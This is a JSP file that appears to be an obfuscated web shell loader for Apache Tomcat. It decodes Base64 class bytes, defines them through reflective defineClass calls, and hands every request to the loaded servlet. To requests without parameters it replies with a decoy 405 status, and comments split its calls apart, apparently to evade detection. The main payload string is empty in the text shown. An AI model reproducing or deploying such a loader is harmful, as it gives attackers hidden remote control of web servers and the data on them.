<%@ page language="java" pageEncoding="UTF-8" %>
<%@ page import="java.util.*" %>
<%@ page import="org.apache.jasper.servlet.*" %>
<%@ page import="org.apache.jasper.runtime.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.lang.reflect.*" %>
<%!
    public class JspClassLoader extends ClassLoader {
        public JspClassLoader(ClassLoader a) {super(a);}
        public Class<?> findClass(String name) {
            Map<String, String> map = new HashMap<>();
            String hhh666_jsp$U = "yv66vgAAADMAIwcAAgEAG29yZy9hcGFjaGUvanNwL2hoaDY2Nl9qc3AkVQcABAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEABnRoaXMkMAEAG0xvcmcvYXBhY2hlL2pzcC9oaGg2NjZfanNwOwEABjxpbml0PgEANShMb3JnL2FwYWNoZS9qc3AvaGhoNjY2X2pzcDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQkAAQALDAAFAAYKAAMADQwABwAOAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTG9yZy9hcGFjaGUvanNwL2hoaDY2Nl9qc3AkVTsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7CgADABgMABkAGgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAFiAQACW0IBAApTb3VyY2VGaWxlAQAPaGhoNjY2X2pzcC5qYXZhAQAMSW5uZXJDbGFzc2VzBwAhAQAZb3JnL2FwYWNoZS9qc3AvaGhoNjY2X2pzcAEAAVUAIAABAAMAAAABEBAABQAGAAAAAgAAAAcACAABAAkAAAA/AAIAAwAAAAsqK7UACiostwAMsQAAAAIADwAAAAYAAQAAABYAEAAAABYAAgAAAAsAEQASAAAAAAALABMAFAACAAEAFQAWAAEACQAAAD0ABAACAAAACSorAyu+twAXsAAAAAIADwAAAAYAAQAAABYAEAAAABYAAgAAAAkAEQASAAAAAAAJABsAHAABAAIAHQAAAAIAHgAfAAAACgABAAEAIAAiAAA=";map.put("hhh666_jsp$U", hhh666_jsp$U);String hhh666_jsp = "";map.put("hhh666_jsp", hhh666_jsp);
            String[] split = name.split("\\.");
            byte[] classBytes = null;
            classBytes = Base64.getDecoder().decode(map.get(split[split.length - 1]));
            Method democlass = null;
            Class<?> aClass = null;
            try {
                democlass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                Method setAccessible = AccessibleObject.class.getMethod("setAccessible", boolean.class);
                setAccessible.invoke(democlass,true);
                aClass = (Class<?>)democlass./*a*/
                        invoke(this, name, classBytes, 0, classBytes.length);
            } catch (Exception e) {e.printStackTrace();}
            return aClass;}}
%>
<%
    JspServlet jspServlet = new JspServlet();
    JspClassLoader jspClassLoader = new JspClassLoader(jspServlet.getClass().getClassLoader());
    HttpJspBase httpJspBase = (HttpJspBase) jspClassLoader.findClass("org.apache.jsp.hhh666_jsp")./*a*/
            newInstance();
    StandardWrapperFacade standardWrapperFacade = new StandardWrapperFacade(new StandardWrapper());
    Field config1 = standardWrapperFacade.getClass().getDeclaredField("config");
    config1.setAccessible(true);
    config1.set(standardWrapperFacade, pageContext.getServletConfig());
    Field context = standardWrapperFacade.getClass().getDeclaredField("context");
    context.setAccessible(true);
    context.set(standardWrapperFacade, pageContext.getServletContext());
    httpJspBase.init(standardWrapperFacade);
    httpJspBase.service(request, response);
%>
<%
        String gGqp3l8 = "";
        if(request.getParameterMap().size()!=0 || request.getReader().read()!=-1){
        }else {
            response.setStatus(405);
            byte[] bytes = Base64.getDecoder().decode(gGqp3l8);
            out.println(new String(bytes));
        }
%>
